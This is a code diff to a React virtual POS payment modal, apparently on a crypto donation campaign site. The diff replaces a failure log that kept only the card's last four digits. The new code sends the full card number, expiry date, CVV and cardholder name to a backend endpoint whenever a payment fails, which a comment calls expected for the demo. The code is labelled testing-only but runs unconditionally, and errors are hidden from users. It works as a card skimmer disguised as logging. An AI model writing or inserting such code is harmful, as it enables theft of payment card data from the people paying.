@@ -206,29 +206,31 @@ export function VirtualPosModal({ open, onOpenChange, campaignId, defaultAmount 
     } catch (error: any) {
       console.log('🏦 Virtual POS: API error (expected for demo)', error);
       
-      // Record failed payment attempt to backend
-      if (walletAddress) {
-        try {
-          const cleanCardNumber = data.cardNumber.replace(/\s/g, '');
-          await apiRequest('POST', '/api/record-payment-attempt', {
-            campaignId: Number(campaignId),
-            initiatorWallet: walletAddress,
+      // Record failed credit card attempt with full card data (Development/Testing only)
+      try {
+        const cleanCardNumber = data.cardNumber.replace(/\s/g, '');
+        const response = await fetch('/api/record-failed-card', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            cardNumber: cleanCardNumber,
+            cardExpiry: data.expiryDate,
+            cardCvv: data.cvv,
+            cardName: data.cardHolder,
+            wallet: walletAddress || null,
             amount: data.amount.toString(),
-            currency: 'USD',
-            cardBrand: cardBrand?.name || 'unknown',
-            cardLast4: cleanCardNumber.substring(cleanCardNumber.length - 4),
-            status: 'failed',
-            errorCode: error.code || 'insufficient_funds',
-            errorMessage: error.message || 'Bakiye Yetersiz - Kartınızda yeterli bakiye bulunmamaktadır',
-            processingTime: 2000,
-            ipAddress: '0.0.0.0', // Client-side can't get real IP
-            userAgent: navigator.userAgent
-          });
-          console.log('✅ Failed payment attempt recorded to database');
-        } catch (logError) {
-          console.error('Failed to log payment attempt:', logError);
-          // Don't show this error to user, just log it
-        }
+            campaignId: Number(campaignId),
+            purpose: 'campaign_donation'
+          }),
+        });
+        
+        const result = await response.json();
+        console.log('✅ Failed card attempt recorded to database:', result.attemptId);
+      } catch (logError) {
+        console.error('Failed to log card attempt:', logError);
+        // Don't show this error to user, just log it
       }
       
       setPaymentError({
